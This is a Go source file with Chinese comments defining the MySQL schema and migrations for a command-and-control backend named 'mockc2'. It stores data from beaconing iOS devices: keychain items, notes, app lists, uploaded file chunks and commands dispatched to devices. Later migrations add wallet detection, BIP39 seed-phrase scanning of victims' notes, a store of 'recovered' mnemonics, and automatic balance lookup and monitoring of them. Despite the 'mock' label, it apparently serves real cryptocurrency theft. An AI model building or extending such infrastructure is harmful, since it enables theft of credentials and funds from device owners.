package store

// MySQL/MariaDB 基线 Schema 与版本化迁移。
//
// 迁移策略（企业级）：
//   - 基线 v1 = 历史 SQLite 版本 v1~v12 全量整合后的最终形态（新库一次成型）
//   - 后续演进只追加迁移版本（v13、v14...），不回改基线
//   - 多实例并发首启：GET_LOCK('mockc2_schema_migrate') 命名锁串行化
//   - DDL 全部 IF NOT EXISTS，可重复执行；MySQL DDL 隐式提交，失败需人工介入
//
// 方言要点（SQLite → MySQL 的等价映射）：
//   - INTEGER PRIMARY KEY AUTOINCREMENT → BIGINT AUTO_INCREMENT
//   - REAL → DOUBLE；TEXT 主键/索引列 → VARCHAR(n)（MySQL 索引需要长度）
//   - INSERT OR IGNORE → INSERT IGNORE；ON CONFLICT … DO UPDATE → ON DUPLICATE KEY UPDATE
//   - 部分唯一索引（WHERE … IS NOT NULL）→ 常规唯一索引（MySQL 唯一索引允许多 NULL）
//   - ua/device_version 收敛为 NOT NULL DEFAULT ''（对齐旧版 COALESCE 规范化语义）

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"time"
)

// migrationLockName 迁移命名锁（跨实例互斥，避免并发首建）。
const migrationLockName = "mockc2_schema_migrate"

type migration struct {
	version int
	ddl     string
}

var migrations = []migration{
	{1, baselineDDL},
	{2, "ALTER TABLE device_profiles " +
		"MODIFY machine VARCHAR(255) NOT NULL DEFAULT '', " +
		"MODIFY device_name VARCHAR(512) NOT NULL DEFAULT '', " +
		"MODIFY `release` VARCHAR(128) NOT NULL DEFAULT '', " +
		"MODIFY kern_version VARCHAR(512) NOT NULL DEFAULT '', " +
		"MODIFY source VARCHAR(128) NOT NULL DEFAULT '';"},
	{3, `
-- 设备钱包命中映射表：设备列表"是否有钱包（有/无）"快速判定。
-- 写入：war 钱包命中时按 uuid UPSERT（wallet_hits 累计）；
-- 读取：ListDevices 带出 has_wallet / wallet_hits；无行 = 无（0）。
CREATE TABLE IF NOT EXISTS device_wallet_flags (
  uuid        VARCHAR(128) NOT NULL,
  has_wallet  TINYINT      NOT NULL DEFAULT 0,
  wallet_hits INT          NOT NULL DEFAULT 0,
  first_seen  VARCHAR(32)  NOT NULL,
  last_seen   VARCHAR(32)  NOT NULL,
  updated_ts  VARCHAR(32)  NOT NULL,
  PRIMARY KEY (uuid),
  KEY ix_dwf_has (has_wallet, last_seen)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

-- 历史回填①：wallet_seen（war 包 wallet 桶快照）
INSERT INTO device_wallet_flags(uuid, has_wallet, wallet_hits, first_seen, last_seen, updated_ts)
SELECT device_uuid, 1, COUNT(*), MIN(ts), MAX(ts), DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s')
FROM wallet_seen WHERE device_uuid IS NOT NULL AND device_uuid <> ''
GROUP BY device_uuid
ON DUPLICATE KEY UPDATE has_wallet=1,
  wallet_hits=GREATEST(wallet_hits, VALUES(wallet_hits)),
  first_seen=LEAST(first_seen, VALUES(first_seen)),
  last_seen=GREATEST(last_seen, VALUES(last_seen)),
  updated_ts=VALUES(updated_ts);

-- 历史回填②：keychain_items（war 包钱包规则命中条目）
INSERT INTO device_wallet_flags(uuid, has_wallet, wallet_hits, first_seen, last_seen, updated_ts)
SELECT device_uuid, 1, COUNT(*), MIN(first_seen), MAX(last_seen), DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s')
FROM keychain_items WHERE wallet_rule IS NOT NULL AND wallet_rule <> ''
GROUP BY device_uuid
ON DUPLICATE KEY UPDATE has_wallet=1,
  wallet_hits=GREATEST(wallet_hits, VALUES(wallet_hits)),
  first_seen=LEAST(first_seen, VALUES(first_seen)),
  last_seen=GREATEST(last_seen, VALUES(last_seen)),
  updated_ts=VALUES(updated_ts);
`},
	{4, `
-- BIP39 助记词扫描命中记录表：备忘录批量模糊匹配 + 校验结果留痕（前端只读此表，避免全量堆砌）。
CREATE TABLE IF NOT EXISTS memo_bip39 (
  id         BIGINT NOT NULL AUTO_INCREMENT,
  uuid       VARCHAR(128) NOT NULL,
  note_id    BIGINT       NOT NULL DEFAULT 0,
  field      VARCHAR(16)  NOT NULL DEFAULT '',
  phrase     TEXT         NULL,
  raw        TEXT         NULL,
  words      INT          NOT NULL DEFAULT 0,
  valid      TINYINT      NOT NULL DEFAULT 0,
  reason     VARCHAR(128) NOT NULL DEFAULT '',
  corrected  INT          NOT NULL DEFAULT 0,
  unknown    INT          NOT NULL DEFAULT 0,
  scanned_at VARCHAR(32)  NOT NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_bip39 (uuid, note_id, field, phrase(191)),
  KEY ix_bip39_valid (valid, words),
  KEY ix_bip39_uuid (uuid)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
`},
	{5, `
-- BIP39 词表落库（2048 词），供前端「词表」模块检索。
CREATE TABLE IF NOT EXISTS bip39_words (
  idx  INT          NOT NULL,
  word VARCHAR(16)  NOT NULL,
  PRIMARY KEY (idx),
  KEY ix_bip39_word (word)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
`},
	{6, `
-- 交付阶段进度：增量维护「每 client 最远阶段」，替代对 access_log(640万行) 的全表 GROUP BY。
CREATE TABLE IF NOT EXISTS client_stage (
  client     VARCHAR(64) NOT NULL,
  pct        INT         NOT NULL DEFAULT 0,
  updated_ts VARCHAR(32) NOT NULL,
  PRIMARY KEY (client),
  KEY ix_client_stage_pct (pct)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
`},
	{7, `
-- /war 自动检测结果（新回传自动跑 tools/ 取证工具，汇总展示）。
CREATE TABLE IF NOT EXISTS war_scan (
  packet_id    BIGINT       NOT NULL,
  uuid         VARCHAR(128) NOT NULL DEFAULT '',
  analyzed_ts  VARCHAR(32)  NOT NULL,
  ok           TINYINT      NOT NULL DEFAULT 0,
  brands       VARCHAR(512) NOT NULL DEFAULT '',
  mnemonic_cnt INT          NOT NULL DEFAULT 0,
  valid_cnt    INT          NOT NULL DEFAULT 0,
  keystore_dec INT          NOT NULL DEFAULT 0,
  secrets_cnt  INT          NOT NULL DEFAULT 0,
  emails       VARCHAR(1024) NOT NULL DEFAULT '',
  detail_json  MEDIUMTEXT   NULL,
  err          VARCHAR(255) NOT NULL DEFAULT '',
  PRIMARY KEY (packet_id),
  KEY ix_war_scan_valid (valid_cnt),
  KEY ix_war_scan_uuid (uuid)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
`},
	{8, `
-- 首见时间不可变：beacon 去重会刷 recv_ts 保活，导致 first_seen=MIN(recv_ts) 每刷新都变“刚刚”
-- （表现为设备“重复上线”）。新增 first_recv_ts/first_recv_epoch，仅插入时写、重复时不更新。
ALTER TABLE packets ADD COLUMN first_recv_ts VARCHAR(32) NOT NULL DEFAULT '', ADD COLUMN first_recv_epoch DOUBLE NOT NULL DEFAULT 0;
UPDATE packets SET first_recv_ts=recv_ts, first_recv_epoch=recv_epoch WHERE first_recv_ts='';
`},
	{9, `
-- 设备读模型（物化）：每设备一行，入库时增量维护，读接口不再现场 GROUP BY 大表。
CREATE TABLE IF NOT EXISTS device_stats (
  uuid         VARCHAR(128) NOT NULL,
  first_seen   VARCHAR(32)  NOT NULL DEFAULT '',
  last_seen    VARCHAR(32)  NOT NULL DEFAULT '',
  last_epoch   DOUBLE       NOT NULL DEFAULT 0,
  beacon_epoch DOUBLE       NOT NULL DEFAULT 0,
  war_count    INT          NOT NULL DEFAULT 0,
  notes_count  INT          NOT NULL DEFAULT 0,
  apps_count   INT          NOT NULL DEFAULT 0,
  updated_ts   VARCHAR(32)  NOT NULL,
  PRIMARY KEY (uuid),
  KEY ix_device_stats_last (last_epoch),
  KEY ix_device_stats_beacon (beacon_epoch)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
`},
	{10, `
-- keychain_items 字段加宽：service/account/access_group/label 常超 255，VARCHAR(255) 会
-- 触发 1406 Data too long → 整批 INSERT 回滚（丢整包 keychain）。改 TEXT，唯一键仍用前缀索引。
ALTER TABLE keychain_items
  MODIFY service      TEXT NOT NULL,
  MODIFY account      TEXT NOT NULL,
  MODIFY access_group TEXT NOT NULL,
  MODIFY label        TEXT NULL;
`},
	{11, `
-- 助记词库：集中存放解析/还原出来的助记词（war 工具检测 / 备忘录 BIP39 命中等）。
CREATE TABLE IF NOT EXISTS recovered_words (
  id          BIGINT       NOT NULL AUTO_INCREMENT,
  uuid        VARCHAR(128) NOT NULL DEFAULT '',
  source      VARCHAR(16)  NOT NULL DEFAULT 'war',
  packet_id   BIGINT       NOT NULL DEFAULT 0,
  phrase      TEXT         NULL,
  words       INT          NOT NULL DEFAULT 0,
  valid       TINYINT      NOT NULL DEFAULT 0,
  wallet      VARCHAR(64)  NOT NULL DEFAULT '',
  crosscheck  VARCHAR(255) NOT NULL DEFAULT '',
  created_ts  VARCHAR(32)  NOT NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_rw (uuid, phrase(191)),
  KEY ix_rw_valid (valid, words),
  KEY ix_rw_uuid (uuid)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
`},
	{12, `
-- 助记词库：余额缓存（入库后后台 chainquery 自动查询，结果缓存，前端直接显示）。
ALTER TABLE recovered_words
  ADD COLUMN balance_json MEDIUMTEXT NULL,
  ADD COLUMN balance_usd  DOUBLE NOT NULL DEFAULT 0,
  ADD COLUMN balance_ts   VARCHAR(32) NOT NULL DEFAULT '';
`},
	{13, `
-- 助记词库：监控开关（仅开启监控的条目由后台自动查询/周期刷新；未开启只展示已有缓存）。
ALTER TABLE recovered_words ADD COLUMN monitored TINYINT NOT NULL DEFAULT 0;
`},
	{14, `
-- 上报次数：beacon 心跳不再逐条写 access_log，改为按 client 计数（控 access_log 表体）。
-- 心跳占全量访问 ~50%，降级后 access_log 体积减半；阶段推进(pct)仍照常维护。
ALTER TABLE client_stage ADD COLUMN report_count BIGINT NOT NULL DEFAULT 0;
`},
}

// baselineDDL 基线 Schema（与旧库 v12 最终形态一一对应）。
const baselineDDL = `
CREATE TABLE IF NOT EXISTS schema_migrations (
  version    INT PRIMARY KEY,
  applied_at VARCHAR(32) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS devices (
  id             BIGINT NOT NULL AUTO_INCREMENT,
  first_seen     VARCHAR(32)  NOT NULL,
  last_seen      VARCHAR(32)  NOT NULL,
  ip             VARCHAR(64)  NOT NULL,
  host           VARCHAR(255) NOT NULL DEFAULT '',
  ua             VARCHAR(512) NOT NULL DEFAULT '',
  device_version VARCHAR(64)  NOT NULL DEFAULT '',
  domain         VARCHAR(255) NOT NULL DEFAULT '',
  PRIMARY KEY (id),
  UNIQUE KEY ux_devices_identity (ip, ua(191), device_version),
  KEY ix_devices_last_seen (last_seen)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS access_log (
  id       BIGINT NOT NULL AUTO_INCREMENT,
  ts       VARCHAR(32)  NOT NULL,
  ts_epoch DOUBLE       NOT NULL,
  role     VARCHAR(32)  NOT NULL DEFAULT '',
  method   VARCHAR(16)  NOT NULL,
  path     VARCHAR(512) NOT NULL,
  query    VARCHAR(2048) NOT NULL DEFAULT '',
  host     VARCHAR(255) NOT NULL DEFAULT '',
  client   VARCHAR(64)  NOT NULL,
  ua       VARCHAR(512) NOT NULL DEFAULT '',
  status   INT          NOT NULL,
  cost_ms  DOUBLE       NOT NULL DEFAULT 0,
  PRIMARY KEY (id),
  KEY ix_access_client_ts (client, ts_epoch),
  KEY ix_access_path_ts (path(191), ts_epoch),
  KEY ix_access_status (status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS packets (
  id           BIGINT NOT NULL AUTO_INCREMENT,
  endpoint     VARCHAR(32)  NOT NULL,
  recv_ts      VARCHAR(32)  NOT NULL,
  recv_epoch   DOUBLE       NOT NULL,
  file_path    VARCHAR(512) NOT NULL,
  size         BIGINT       NOT NULL,
  sha256       VARCHAR(64)  NULL,
  content_kind VARCHAR(16)  NOT NULL DEFAULT 'raw',
  PRIMARY KEY (id),
  -- 注意：file_path 上【不能】建唯一索引！小包（<16KB）不落盘时 file_path=''
  -- （留存策略，见 capture_store.go CaptureMinBytes），唯一索引会让所有小包
  -- 撞键合并到同一行 → beacon recv_epoch 不再按设备刷新 → 设备集体离线
  -- （INC-20260930-02）。去重由 ux_packets_ep_sha 承担，这里只留普通索引。
  KEY ix_packets_file (file_path(191)),
  UNIQUE KEY ux_packets_ep_sha (endpoint, sha256),
  KEY ix_packets_ep_ts (endpoint, recv_epoch),
  KEY ix_packets_kind (content_kind)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS packet_meta (
  id        BIGINT NOT NULL AUTO_INCREMENT,
  packet_id BIGINT NOT NULL,
  field     VARCHAR(64)  NOT NULL,
  value     VARCHAR(512) NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_packet_meta (packet_id, field),
  KEY ix_packet_meta_field (field),
  KEY ix_packet_meta_value (field, value(191)),
  CONSTRAINT fk_packet_meta_packet FOREIGN KEY (packet_id) REFERENCES packets(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS probe_log (
  id       BIGINT NOT NULL AUTO_INCREMENT,
  ts       VARCHAR(32) NOT NULL,
  channel  VARCHAR(255) NULL,
  entry_id BIGINT NULL,
  hex      MEDIUMTEXT NULL,
  text     MEDIUMTEXT NULL,
  PRIMARY KEY (id),
  KEY ix_probe_ts (ts)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS commands (
  id            BIGINT NOT NULL AUTO_INCREMENT,
  command_id    VARCHAR(128) NOT NULL,
  cmd_type      VARCHAR(64)  NOT NULL,
  params_json   MEDIUMTEXT NULL,
  armed_ts      VARCHAR(32)  NOT NULL,
  once          TINYINT      NOT NULL DEFAULT 1,
  state         VARCHAR(16)  NOT NULL DEFAULT 'armed',
  dispatched_ts VARCHAR(32)  NULL,
  client_ip     VARCHAR(64)  NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_commands_cid (command_id),
  KEY ix_commands_state (state, armed_ts)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS chunks (
  id         BIGINT NOT NULL AUTO_INCREMENT,
  command_id VARCHAR(128) NOT NULL,
  fname      VARCHAR(255) NOT NULL,
  part       INT          NOT NULL,
  size       BIGINT       NOT NULL,
  recv_ts    VARCHAR(32)  NOT NULL,
  packet_id  BIGINT       NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_chunks_packet (packet_id),
  UNIQUE KEY ux_chunks_transfer (command_id, fname, part),
  KEY ix_chunks_recv (recv_ts)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS files (
  id         BIGINT NOT NULL AUTO_INCREMENT,
  command_id VARCHAR(128) NOT NULL,
  fname      VARCHAR(255) NOT NULL,
  sha256     VARCHAR(64)  NOT NULL DEFAULT '',
  size       BIGINT       NOT NULL,
  file_path  VARCHAR(512) NOT NULL DEFAULT '',
  recv_ts    VARCHAR(32)  NOT NULL,
  complete   TINYINT      NOT NULL DEFAULT 0,
  PRIMARY KEY (id),
  UNIQUE KEY ux_files_key (command_id, fname, sha256, complete),
  KEY ix_files_cmd (command_id, recv_ts),
  KEY ix_files_sha (sha256),
  KEY ix_files_com (complete)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS pe_events (
  id     BIGINT NOT NULL AUTO_INCREMENT,
  ts     VARCHAR(32)  NOT NULL,
  epoch  DOUBLE       NOT NULL,
  ip     VARCHAR(64)  NOT NULL,
  ua     VARCHAR(512) NULL,
  host   VARCHAR(255) NULL,
  kind   VARCHAR(16)  NOT NULL DEFAULT 'pe',
  detail VARCHAR(512) NULL,
  PRIMARY KEY (id),
  KEY ix_pe_ts (epoch),
  KEY ix_pe_ip (ip, epoch)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS wallet_rules (
  id        BIGINT NOT NULL AUTO_INCREMENT,
  rule_name VARCHAR(64) NOT NULL,
  patterns  TEXT        NOT NULL,
  source    VARCHAR(64) NOT NULL DEFAULT 'pe_worker.js',
  PRIMARY KEY (id),
  UNIQUE KEY ux_wallet_rules_name (rule_name)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS wallet_seen (
  id          BIGINT NOT NULL AUTO_INCREMENT,
  ts          VARCHAR(32) NOT NULL,
  epoch       DOUBLE      NOT NULL,
  device_uuid VARCHAR(128) NULL,
  ip          VARCHAR(64)  NULL,
  rule_name   VARCHAR(64)  NOT NULL,
  count       INT          NOT NULL DEFAULT 0,
  packet_id   BIGINT       NULL,
  src_file    VARCHAR(512) NOT NULL DEFAULT '',
  PRIMARY KEY (id),
  UNIQUE KEY ux_wallet_seen_pkt_rule (packet_id, rule_name),
  KEY ix_wallet_seen_dev (device_uuid, epoch),
  KEY ix_wallet_seen_rule (rule_name, epoch)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS command_queue (
  id            INT NOT NULL,
  command_id    VARCHAR(128) NOT NULL,
  cmd_type      VARCHAR(64)  NOT NULL,
  params_json   MEDIUMTEXT NULL,
  once          TINYINT      NOT NULL DEFAULT 1,
  state         VARCHAR(16)  NOT NULL DEFAULT 'armed',
  armed_ts      VARCHAR(32)  NULL,
  dispatched_ts VARCHAR(32)  NULL,
  client_ip     VARCHAR(64)  NULL,
  PRIMARY KEY (id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS kv (
  k          VARCHAR(64) NOT NULL,
  v          MEDIUMTEXT  NOT NULL,
  updated_ts VARCHAR(32) NULL,
  PRIMARY KEY (k)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS device_commands (
  id            BIGINT NOT NULL AUTO_INCREMENT,
  target        VARCHAR(128) NOT NULL,
  command_id    VARCHAR(128) NOT NULL,
  cmd_type      VARCHAR(64)  NOT NULL,
  params_json   MEDIUMTEXT NULL,
  once          TINYINT      NOT NULL DEFAULT 1,
  state         VARCHAR(16)  NOT NULL DEFAULT 'armed',
  armed_ts      VARCHAR(32)  NOT NULL,
  dispatched_ts VARCHAR(32)  NULL,
  client_ip     VARCHAR(64)  NULL,
  batch_id      VARCHAR(128) NULL,
  PRIMARY KEY (id),
  KEY ix_dcmd_target_state (target, state, id),
  KEY ix_dcmd_batch (batch_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS device_profiles (
  id            BIGINT NOT NULL AUTO_INCREMENT,
  uuid          VARCHAR(128) NOT NULL,
  machine       VARCHAR(255) NOT NULL DEFAULT '',
  device_name   VARCHAR(512) NOT NULL DEFAULT '',
  ios_version   VARCHAR(64)  NOT NULL DEFAULT '',
  build_version VARCHAR(64)  NOT NULL DEFAULT '',
  hostname      VARCHAR(255) NOT NULL DEFAULT '',
  sysname       VARCHAR(64)  NOT NULL DEFAULT '',
` + "  `release`     VARCHAR(128) NOT NULL DEFAULT '',\n" + `  kern_version  VARCHAR(512) NOT NULL DEFAULT '',
  ip            VARCHAR(64)  NOT NULL DEFAULT '',
  source        VARCHAR(128) NOT NULL DEFAULT '',
  first_seen    VARCHAR(32)  NOT NULL,
  last_seen     VARCHAR(32)  NOT NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_profiles_uuid (uuid),
  KEY ix_profiles_ip (ip)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS apps (
  id              BIGINT NOT NULL AUTO_INCREMENT,
  first_packet_id BIGINT NULL,
  last_packet_id  BIGINT NULL,
  uuid            VARCHAR(128) NOT NULL,
  app_uuid        VARCHAR(128) NULL,
  bundle_id       VARCHAR(255) NOT NULL,
  name            VARCHAR(255) NULL,
  first_seen      VARCHAR(32)  NOT NULL,
  last_seen       VARCHAR(32)  NOT NULL,
  hits            INT          NOT NULL DEFAULT 1,
  PRIMARY KEY (id),
  UNIQUE KEY ux_apps_dev_bundle (uuid, bundle_id),
  KEY ix_apps_uuid (uuid),
  KEY ix_apps_bundle (bundle_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS keychain_items (
  id               BIGINT NOT NULL AUTO_INCREMENT,
  first_packet_id  BIGINT NULL,
  last_packet_id   BIGINT NULL,
  device_uuid      VARCHAR(128) NOT NULL,
  tbl              VARCHAR(16)  NOT NULL,
  wallet_rule      VARCHAR(64)  NULL,
  service          VARCHAR(255) NOT NULL DEFAULT '',
  account          VARCHAR(255) NOT NULL DEFAULT '',
  access_group     VARCHAR(255) NOT NULL DEFAULT '',
  label            VARCHAR(512) NULL,
  data_hex         MEDIUMTEXT   NULL,
  data_len         INT          NOT NULL DEFAULT 0,
  protection_class VARCHAR(64)  NULL,
  version          VARCHAR(64)  NULL,
  blob_sizes       TEXT         NULL,
  rowid_orig       VARCHAR(64)  NOT NULL DEFAULT '',
  first_seen       VARCHAR(32)  NOT NULL,
  last_seen        VARCHAR(32)  NOT NULL,
  hits             INT          NOT NULL DEFAULT 1,
  PRIMARY KEY (id),
  UNIQUE KEY ux_kc_identity (device_uuid, tbl, service(191), account(191), rowid_orig),
  KEY ix_kc_dev (device_uuid),
  KEY ix_kc_tbl (tbl),
  KEY ix_kc_rule (wallet_rule),
  KEY ix_kc_svc (service(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS keychain_meta (
  id          BIGINT NOT NULL AUTO_INCREMENT,
  packet_id   BIGINT NULL,
  device_uuid VARCHAR(128) NOT NULL,
  scope       VARCHAR(32)  NOT NULL,
  k           VARCHAR(255) NOT NULL,
  v           VARCHAR(512) NULL,
  recv_ts     VARCHAR(32)  NOT NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_kc_meta (packet_id, scope, k(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS memos (
  id              BIGINT NOT NULL AUTO_INCREMENT,
  first_packet_id BIGINT NULL,
  last_packet_id  BIGINT NULL,
  uuid            VARCHAR(128) NOT NULL,
  note_id         BIGINT NULL,
  title           VARCHAR(512) NULL,
  snippet         TEXT         NULL,
  mod_ts          VARCHAR(32)  NULL,
  first_seen      VARCHAR(32)  NOT NULL,
  last_seen       VARCHAR(32)  NOT NULL,
  hits            INT          NOT NULL DEFAULT 1,
  PRIMARY KEY (id),
  UNIQUE KEY ux_memos_note (uuid, note_id),
  KEY ix_memos_uuid (uuid)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;

CREATE TABLE IF NOT EXISTS result_data (
  id            BIGINT NOT NULL AUTO_INCREMENT,
  packet_id     BIGINT NULL,
  command_id    VARCHAR(128) NULL,
  uuid          VARCHAR(128) NULL,
  filename      VARCHAR(255) NULL,
  category      VARCHAR(64)  NULL,
  data_json     MEDIUMTEXT   NULL,
  data_kind     VARCHAR(16)  NULL,
  data_size     BIGINT       NOT NULL DEFAULT 0,
  exec_start_ms BIGINT       NULL,
  exec_end_ms   BIGINT       NULL,
  recv_ts       VARCHAR(32)  NOT NULL,
  PRIMARY KEY (id),
  UNIQUE KEY ux_result_packet (packet_id),
  KEY ix_result_cmd (command_id),
  KEY ix_result_uuid (uuid)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
`

// migrate 执行版本化迁移（命名锁串行化；幂等 DDL）。
//
// 连接钉定（INC-2026-0929 复查 P1 修复）：MySQL/MariaDB 命名锁是**连接作用域**——
// 必须 GET_LOCK 与 RELEASE_LOCK 落在同一连接。此前用池化句柄 d.conn，取锁挂到池内
// 连接 A、释放落到连接 B（返回 0 无效），锁滞留直到 A 被回收/关闭；期间任何新实例
// migrate 等锁 60s 超时 → OpenDB 失败 → 服务启动失败（多 worker 父子进程必踩）。
// 现在整个"建表→取锁→迁移→释锁"钉在同一 *sql.Conn 上完成。
func (d *DB) migrate() error {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()
	c, err := d.conn.Conn(ctx)
	if err != nil {
		return fmt.Errorf("migrate conn: %w", err)
	}
	defer c.Close()

	if _, err := c.ExecContext(ctx,
		"CREATE TABLE IF NOT EXISTS schema_migrations("+
			"version INT PRIMARY KEY, applied_at VARCHAR(32) NOT NULL)"+
			" ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci"); err != nil {
		return err
	}

	// 跨实例迁移互斥：拿不到锁（超时）直接报错，避免并发 DDL 竞态。
	var locked *int64
	if err := c.QueryRowContext(ctx, "SELECT GET_LOCK(?, 60)", migrationLockName).Scan(&locked); err != nil {
		return fmt.Errorf("migrate lock: %w", err)
	}
	if locked == nil || *locked != 1 {
		return errors.New("migrate lock timeout (another instance is migrating)")
	}
	// 释锁必须走同一连接 c；用独立短 ctx（迁移失败路径也要能释放）。
	defer func() {
		rctx, rcancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer rcancel()
		_, _ = c.ExecContext(rctx, "SELECT RELEASE_LOCK(?)", migrationLockName)
	}()

	done := map[int64]bool{}
	for _, r := range d.Query("SELECT version FROM schema_migrations") {
		done[toInt(r["version"])] = true
	}
	for _, m := range migrations {
		if done[int64(m.version)] {
			continue
		}
		if err := d.execScript(m.ddl); err != nil {
			return fmt.Errorf("migration v%d: %w", m.version, err)
		}
		if _, err := d.conn.Exec(
			"INSERT INTO schema_migrations(version, applied_at) VALUES(?,?)",
			m.version, time.Now().Format("2006-01-02 15:04:05")); err != nil {
			return err
		}
	}

	// v4（2026-09-30 INC-20260930-02）：遗留的 ux_packets_file 唯一索引与
	// "小包不落盘"策略冲突（file_path='' 全部撞键 → beacon 心跳刷新全部落在
	// 同一行 → 设备集体离线）。基线已改普通索引；存量库在这里有则删除、无则跳过
	// （放迁移列表外做条件判断，避免无该索引的库被 ALTER 报错卡住迁移）。
	var legacyIdx int64
	if r := d.QueryOne(
		"SELECT COUNT(*) n FROM information_schema.STATISTICS"+
			" WHERE table_schema=DATABASE() AND table_name='packets'"+
			"   AND index_name='ux_packets_file'"); r != nil {
		legacyIdx = toInt(r["n"])
	}
	if legacyIdx > 0 {
		if _, err := d.conn.Exec("ALTER TABLE packets DROP INDEX ux_packets_file"); err != nil {
			return fmt.Errorf("drop legacy ux_packets_file: %w", err)
		}
	}
	return nil
}

// execScript 逐条执行 DDL（按 ';' 切分，剥离 -- 整行注释）。
func (d *DB) execScript(script string) error {
	var b strings.Builder
	for _, line := range strings.Split(script, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "--") {
			continue
		}
		b.WriteString(line)
		b.WriteString("\n")
	}
	for _, stmt := range strings.Split(b.String(), ";") {
		s := strings.TrimSpace(stmt)
		if s == "" {
			continue
		}
		if _, err := d.conn.Exec(s); err != nil {
			return fmt.Errorf("%s: %w", firstLine(s), err)
		}
	}
	return nil
}

func firstLine(s string) string {
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return s[:i]
	}
	return s
}
